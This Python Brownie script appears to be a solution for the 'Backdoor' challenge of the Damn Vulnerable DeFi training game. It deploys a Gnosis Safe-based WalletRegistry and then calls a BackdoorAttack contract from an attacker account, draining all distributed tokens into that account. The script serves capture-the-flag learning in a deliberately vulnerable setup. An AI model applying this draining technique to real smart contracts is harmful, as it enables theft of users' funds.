from brownie import *


def main():
    deployer = a[0]
    attacker = a[1]
    alice = a[2]
    bob = a[3]
    charlie = a[4]
    david = a[5]
    users = [alice, bob, charlie, david]

    AMOUNT_TOKENS_DISTRIBUTED = Wei('40 ether')

    GnosisSafe = globals()['safe-global/safe-contracts@1.3.0/GnosisSafe']

    masterCopy = GnosisSafe.deploy({'from': deployer})
    walletFactory = GnosisSafeProxyFactory.deploy({'from': deployer})
    token = DamnValuableToken.deploy({'from': deployer})

    walletRegistry = WalletRegistry.deploy(
        masterCopy,
        walletFactory,
        token,
        users,
        {'from': deployer}
    )

    for u in users:
        assert walletRegistry.beneficiaries(u)

    token.transfer(walletRegistry, AMOUNT_TOKENS_DISTRIBUTED)

    # Exploit code here
    attack = BackdoorAttack.deploy(users, {'from': attacker})
    attack.attack(masterCopy, walletFactory, walletRegistry, token, {'from': attacker})

    # Success conditions
    for u in users:
        wallet = walletRegistry.wallets(u)
        assert wallet != '0x' + '0'*40

    assert not walletRegistry.beneficiaries(u)

    assert token.balanceOf(attacker) == AMOUNT_TOKENS_DISTRIBUTED

    print('Challenge successfully passed.')

